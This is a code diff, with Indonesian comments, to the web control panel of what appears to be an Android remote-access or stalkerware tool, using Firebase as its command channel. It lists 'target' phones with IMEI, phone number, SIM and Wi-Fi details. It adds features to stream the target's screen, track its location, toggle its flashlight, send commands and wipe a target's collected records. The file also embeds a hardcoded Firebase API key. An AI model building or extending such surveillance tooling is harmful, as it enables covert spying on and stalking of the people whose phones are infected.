@@ -3,7 +3,7 @@
  * ============================================================ */
 
 // ============================================================
-// FIREBASE CONFIG (HARDCODED)
+// FIREBASE CONFIG
 // ============================================================
 const firebaseConfig = {
   apiKey: "AIzaSyBx7iNsKzUjiZh-cVnfw3Tl8AYPz_xjH7A",
@@ -47,38 +47,33 @@ const LOADING_TEXTS = [
   "Almost ready..."
 ];
 
-// ============================================================
-// HELPERS
-// ============================================================
 const $ = (s, p = document) => p.querySelector(s);
 const $$ = (s, p = document) => [...p.querySelectorAll(s)];
 
-// Firebase function placeholders
-let fbRef, fbSet, fbPush, fbUpdate, fbOnValue, fbGet;
-
-// ============================================================
-// DYNAMIC FIREBASE SDK LOAD
-// ============================================================
-async function loadFirebaseSDK() {
-  const appMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js");
-  const dbMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js");
-  
-  fbRef = dbMod.ref;
-  fbSet = dbMod.set;
-  fbPush = dbMod.push;
-  fbUpdate = dbMod.update;
-  fbOnValue = dbMod.onValue;
-  fbGet = dbMod.get;
-  
-  const app = appMod.initializeApp(firebaseConfig);
-  State.db = dbMod.getDatabase(app);
-}
+let fbRef, fbSet, fbPush, fbUpdate, fbOnValue, fbGet, fbRemove;
 
 // ============================================================
 // HAPTIC
 // ============================================================
 function haptic(ms = 10) {
   try { if (navigator.vibrate) navigator.vibrate(ms); } catch (e) {}
+}
+
+// ============================================================
+// LOAD FIREBASE SDK
+// ============================================================
+async function loadFirebaseSDK() {
+  const appMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js");
+  const dbMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js");
+  fbRef = dbMod.ref;
+  fbSet = dbMod.set;
+  fbPush = dbMod.push;
+  fbUpdate = dbMod.update;
+  fbOnValue = dbMod.onValue;
+  fbGet = dbMod.get;
+  fbRemove = dbMod.remove;
+  const app = appMod.initializeApp(firebaseConfig);
+  State.db = dbMod.getDatabase(app);
 }
 
 // ============================================================
@@ -152,6 +147,23 @@ function fmtSize(bytes) {
 function cleanTitle(t) {
   if (!t) return "";
   return t.split("\t")[0].trim();
+}
+
+// Nama device pake BRAND (dari owner side)
+function getDeviceName(t) {
+  if (!t) return "Unknown Device";
+  if (t.brand && t.brand !== "Unknown" && t.brand !== "") {
+    return t.brand.charAt(0).toUpperCase() + t.brand.slice(1).toLowerCase();
+  }
+  if (t.model && t.model !== "Unknown") return t.model;
+  return "Unknown Device";
+}
+
+// Cek Android version >= 11 (SDK >= 30)
+function isAndroid11Plus(t) {
+  if (!t) return false;
+  const sdk = parseInt(t.sdk || "0");
+  return sdk >= 30;
 }
 
 async function sha256(text) {
@@ -441,11 +453,12 @@ function renderTargetList() {
     const bat = t.battery || 0;
     const low = bat < 20;
     const batIcon = bat > 75 ? "full" : bat > 50 ? "three-quarters" : bat > 25 ? "half" : "quarter";
+    const deviceName = getDeviceName(t);  // ← PAKE BRAND
     return `
       <div class="target-item" data-tid="${t.id}">
         <div class="ti-avatar"><i class="fa-solid fa-mobile-screen"></i></div>
         <div class="ti-info">
-          <div class="n">${t.model || "Unknown Device"}</div>
+          <div class="n">${deviceName}</div>
           <div class="d">
             <span>${t.ip || "—"}</span>
             ${t.battery ? `<span class="battery-badge ${low ? "low" : ""}"><i class="fa-solid fa-battery-${batIcon}"></i>${bat}%</span>` : ""}
@@ -475,9 +488,14 @@ function openTargetDetail(tid) {
   const t = State.targets.find(x => x.id === tid);
   if (!t) return;
   State.currentTarget = t;
+  
+  const deviceName = getDeviceName(t);
+  const androidVer = t.android || "?";
+  const canLiveCam = isAndroid11Plus(t);  // ← CEK ANDROID VERSION
+  
   const box = $("#modal-box");
   box.innerHTML = `
-    <h3>${t.model || "Device"}</h3>
+    <h3>${deviceName}</h3>
     <div class="sub">ID: ${tid}</div>
     <div class="tabs">
       <button data-tab="info" class="active"><i class="fa-solid fa-circle-info"></i> Info</button>
@@ -488,49 +506,89 @@ function openTargetDetail(tid) {
     <div class="tab-panel active" data-panel="info">
       <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Status</span><span style="color:${t.status === 'online' ? 'var(--success)' : 'var(--text-dim)'};font-weight:700">${(t.status || "offline").toUpperCase()}</span></div>
       <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Model</span><span style="font-weight:600">${t.model || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
       <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Brand</span><span style="font-weight:600">${t.brand || "—"}</span></div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Model</span><span style="font-weight:600">${t.model || "—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
       <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">IP</span><span style="font-weight:600;font-family:'JetBrains Mono',monospace">${t.ip || "—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Android</span><span style="font-weight:600">${t.android || "—"}</span></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Android</span><span style="font-weight:600">${androidVer}</span></div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">SDK</span><span style="font-weight:600">${t.sdk || "—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
       <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">IMEI</span><span style="font-weight:600;font-family:'JetBrains Mono',monospace;font-size:11px">${t.imei || "—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
       <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">SIM</span><span style="font-weight:600">${t.simOperator || "—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Phone</span><span style="font-weight:600">${t.phoneNumber || "—"}</span></div>
+      <div style="height:1px;background:var(--border)"></div>
       <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Battery</span><span style="font-weight:600">${t.battery ? t.battery + "%" : "—"}</span></div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Wifi</span><span style="font-weight:600;font-size:11px">${t.wifiSSID || "—"}</span></div>
       <div style="height:1px;background:var(--border)"></div>
       <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Last Seen</span><span style="font-weight:600">${timeAgo(t.lastSeen)}</span></div>
     </div>
     <div class="tab-panel" data-panel="live">
-      <div class="toggle-row">
-        <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-video"></i></div><div class="tr-info"><div class="n">Live Cam</div><div class="d">Stream layar target</div></div></div>
-        <label class="switch"><input type="checkbox" id="sw-live"><span class="slider"></span></label>
+      <div class="toggle-row ${canLiveCam ? "" : "disabled"}" ${canLiveCam ? "" : 'style="opacity:.5"'}>
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-video"></i></div>
+          <div class="tr-info">
+            <div class="n">Live Cam</div>
+            <div class="d">${canLiveCam ? "Stream layar target" : "Cuma work di Android 11+"}</div>
+          </div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="sw-live" ${canLiveCam ? "" : "disabled"}>
+          <span class="slider"></span>
+        </label>
       </div>
-      <div class="live-view" id="live-view"><div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div></div>
+      ${!canLiveCam ? `<div style="font-size:11px;color:var(--warning);padding:10px;background:var(--warning-soft);border-radius:8px;margin-top:8px;text-align:center"><i class="fa-solid fa-triangle-exclamation"></i> Target pake Android ${androidVer} (SDK ${t.sdk || "?"}). Live Cam cuma support Android 11+ (SDK 30+).</div>` : ""}
+      <div class="live-view" id="live-view" style="margin-top:12px">
+        <div class="empty"><i class="fa-solid fa-image"></i><div>${canLiveCam ? "Live cam nonaktif" : "Tidak tersedia"}</div></div>
+      </div>
     </div>
     <div class="tab-panel" data-panel="locate">
       <div class="toggle-row">
-        <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div><div class="tr-info"><div class="n">Locate</div><div class="d">Lokasi target</div></div></div>
-        <label class="switch"><input type="checkbox" id="sw-loc"><span class="slider"></span></label>
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div>
+          <div class="tr-info"><div class="n">Locate</div><div class="d">Lokasi target</div></div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="sw-loc"><span class="slider"></span>
+        </label>
       </div>
-      <div class="loc-map" id="loc-map"><div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div></div>
+      <div class="loc-map" id="loc-map">
+        <div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>
+      </div>
       <div class="loc-coords" id="loc-coords">—</div>
     </div>
     <div class="tab-panel" data-panel="tools">
       <div class="toggle-row">
-        <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div><div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight</div></div></div>
-        <label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label>
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div>
+          <div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="sw-flash"><span class="slider"></span>
+        </label>
       </div>
       <div class="toggle-row">
-        <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip-kedip</div></div></div>
-        <label class="switch"><input type="checkbox" id="sw-strobo"><span class="slider"></span></label>
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-bolt"></i></div>
+          <div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip tiap 1 detik</div></div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="sw-strobo"><span class="slider"></span>
+        </label>
       </div>
     </div>
-    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+    <div class="modal-actions">
+      <button class="btn btn-danger" id="btn-delete-target"><i class="fa-solid fa-trash"></i> Hapus</button>
+      <button class="btn btn-ghost" onclick="closeModal()">Tutup</button>
+    </div>`;
   $("#modal").classList.add("show");
+  
+  // Tab switching
   $$(".tabs button", box).forEach(b => {
     b.onclick = () => {
       haptic(5);
@@ -538,14 +596,35 @@ function openTargetDetail(tid) {
       b.classList.add("active");
       const tab = b.dataset.tab;
       $$(".tab-panel", box).forEach(p => p.classList.toggle("active", p.dataset.panel === tab));
-      if (tab === "live") setupLiveScreen(tid);
+      if (tab === "live" && canLiveCam) setupLiveScreen(tid);
       if (tab === "locate") setupLocate(tid);
     };
   });
-  $("#sw-live", box).onchange = (e) => toggleLive(tid, e.target.checked);
+  
+  // Toggle events
+  if (canLiveCam) {
+    $("#sw-live", box).onchange = (e) => toggleLive(tid, e.target.checked);
+  }
   $("#sw-loc", box).onchange = (e) => toggleLocate(tid, e.target.checked);
   $("#sw-flash", box).onchange = (e) => toggleFlash(tid, e.target.checked);
   $("#sw-strobo", box).onchange = (e) => toggleStrobo(tid, e.target.checked);
+  
+  // Tombol hapus target
+  $("#btn-delete-target").onclick = async () => {
+    haptic(20);
+    if (!confirm(`Hapus target "${deviceName}"?\n\nSemua data (commands, live, locations) akan dihapus.`)) return;
+    try {
+      await fbRemove(fbRef(State.db, "targets/" + tid));
+      await fbRemove(fbRef(State.db, "commands/" + tid));
+      await fbRemove(fbRef(State.db, "live/" + tid));
+      await fbRemove(fbRef(State.db, "locations/" + tid));
+      toast("Target dihapus", "ok");
+      closeModal();
+      loadTargets();
+    } catch (e) {
+      toast("Gagal hapus: " + e.message, "err");
+    }
+  };
 }
 
 async function sendCommand(tid, type, payload = {}) {
